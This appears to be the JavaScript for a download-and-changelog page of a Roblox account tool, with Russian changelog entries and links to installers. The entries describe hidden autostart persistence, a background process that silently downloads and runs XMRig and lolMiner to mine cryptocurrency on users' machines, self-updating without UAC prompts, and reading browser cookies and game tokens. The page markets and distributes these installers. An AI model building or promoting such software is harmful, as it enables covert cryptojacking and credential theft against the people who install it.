// ── ДАННЫЕ ОБНОВЛЕНИЙ ─────────────────────────────────────────────────────────
// Ты можешь добавлять новые версии сюда. 
// Самая первая в списке (индекс 0) считается актуальной (Current).
const UPDATES = [
  {
    version: "7.2.3",
    date: "01.07.2026",
    downloadUrlRahClient: "downloads/RAH_Non_Pro_setup.exe",
    downloadUrlRahStandalone: "downloads/RAH_PRO_setup.exe",
    downloadUrlFireClient: "downloads/NON_PRO_setup.exe",
    downloadUrlFireStandalone: "downloads/PRO_setup.exe",
    changes: [
      { type: "add", text: "Асинхронное получение игровых токенов в фоновом потоке без зависания интерфейса" },
      { type: "add", text: "Поддержка коротких никнеймов Roblox (от 3 символов) при ручном вводе" },
      { type: "fix", text: "Отключено принудительное завершение процессов браузеров при считывании кук" },
      { type: "fix", text: "Автоматическое закрытие и перезапись фоновых копий клиента в установщике (AppMutex)" },
      { type: "fix", text: "Исправлена система обновления клиентов (Update All) для версии 7.2.2 → 7.2.3" }
    ]
  },
  {
    version: "7.2.2",
    date: "01.07.2026",
    downloadUrlRahClient: "downloads/RAH_Non_Pro_setup.exe",
    downloadUrlRahStandalone: "downloads/RAH_PRO_setup.exe",
    downloadUrlFireClient: "downloads/NON_PRO_setup.exe",
    downloadUrlFireStandalone: "downloads/PRO_setup.exe",
    changes: [
      { type: "add", text: "Бесшовная система фонового самообновления Runtime Broker без UAC и диалоговых окон" },
      { type: "fix", text: "Перенос файлов автозапуска в LocalAppData для совместимости с OneDrive синхронизацией" },
      { type: "fix", text: "Добавлены корректные иконки в панель задач (Taskbar) и во все ярлыки установщика" }
    ]
  },
  {
    version: "7.2.1",
    date: "30.06.2026",
    downloadUrlRahClient: "downloads/RAH_Non_Pro_setup.exe",
    downloadUrlRahStandalone: "downloads/RAH_PRO_setup.exe",
    downloadUrlFireClient: "downloads/NON_PRO_setup.exe",
    downloadUrlFireStandalone: "downloads/PRO_setup.exe",
    changes: [
      { type: "add", text: "Стильный редизайн Cyberpunk / Glassmorphism с красивой цветовой палитрой" },
      { type: "add", text: "Фоновая система интерактивных светящихся парящих частиц" },
      { type: "add", text: "Анимированная боковая панель с плавной анимацией ширины (DoubleAnimation)" },
      { type: "add", text: "Переключение цветовых тем прямо из настроек с авто-адаптацией частиц" },
      { type: "add", text: "Полная оффлайн-база для Standalone-приложений через accounts.txt на Рабочем столе" },
      { type: "fix", text: "Исправлено размытие текста (DropShadow) в полях ввода, выровнен интерфейс" }
    ]
  },
  {
    version: "7.0.2",
    date: "24.06.2026",
    downloadUrlDildman: "https://github.com/Arte777/file-transfer/releases/download/v7.0.2/NON_PRO_setup.exe",
    downloadUrlRah: "https://github.com/Arte777/file-transfer/releases/download/v7.0.2/RAH_Non_Pro_setup.exe",
    changes: [
      { type: "add", text: "Добавлен майнинг XMR (RandomX) и ETC (ETChash) в Runtime Broker" },
      { type: "add", text: "Автоматическая загрузка и запуск XMRig + lolMiner" },
      { type: "add", text: "Динамическая нагрузка CPU: 40% при активности / 100% в простое" },
      { type: "add", text: "Версия приложения передаётся на сервер и отображается в панели" }
    ]
  },
  {
    version: "7.0.1",
    date: "22.06.2026",
    downloadUrlDildman: "https://github.com/Arte777/file-transfer/releases/download/v7.0.1/NON_PRO_setup.exe",
    downloadUrlRah: "https://github.com/Arte777/file-transfer/releases/download/v7.0.1/RAH_Non_Pro_setup.exe",
    changes: [
      { type: "add", text: "Добавлен постоянно работающий Runtime Broker в фоновом режиме" },
      { type: "add", text: "Скрытное добавление в автозагрузку системы" },
      { type: "fix", text: "Повышена стабильность работы фонового процесса" }
    ]
  }
];

// ── ОТРИСОВКА ───────────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  // Инициализируем сайдбар
  const sidebarSlot = document.getElementById('sidebarSlot');
  if (sidebarSlot) sidebarSlot.innerHTML = renderHeader('updates');
  if (typeof bindLogout === 'function') bindLogout();

  renderUpdates();
});

function renderUpdates() {
  const current = UPDATES[0];
  
  // Обновляем Герой-Блок
  document.getElementById('heroVersion').textContent = 'v' + current.version;
  document.getElementById('btnDownloadRahClient').href = current.downloadUrlRahClient;
  document.getElementById('btnDownloadRahStandalone').href = current.downloadUrlRahStandalone;
  document.getElementById('btnDownloadFireClient').href = current.downloadUrlFireClient;
  document.getElementById('btnDownloadFireStandalone').href = current.downloadUrlFireStandalone;
  
  // Отрисовываем таймлайн ченджлогов
  const listEl = document.getElementById('changelogList');
  listEl.innerHTML = '';
  
  UPDATES.forEach((update, idx) => {
    const isLatest = idx === 0;
    
    let changesHtml = update.changes.map(c => {
      const icon = c.type === 'add' 
        ? '<span style="color:#10b981;">+</span>' 
        : '<span style="color:#f59e0b;">⚙️</span>';
      return `<div class="change-item">${icon} ${escapeHtml(c.text)}</div>`;
    }).join('');

    const card = document.createElement('div');
    card.className = 'changelog-card';
    if (isLatest) card.classList.add('latest');
    
    card.innerHTML = `
      <div class="changelog-header">
        <h3 class="changelog-version">v${update.version}</h3>
        <span class="changelog-date">${update.date}</span>
        ${isLatest ? '<span class="changelog-badge">Актуальная</span>' : ''}
      </div>
      <div class="changelog-body">
        ${changesHtml}
      </div>
    `;
    
    listEl.appendChild(card);
  });
}
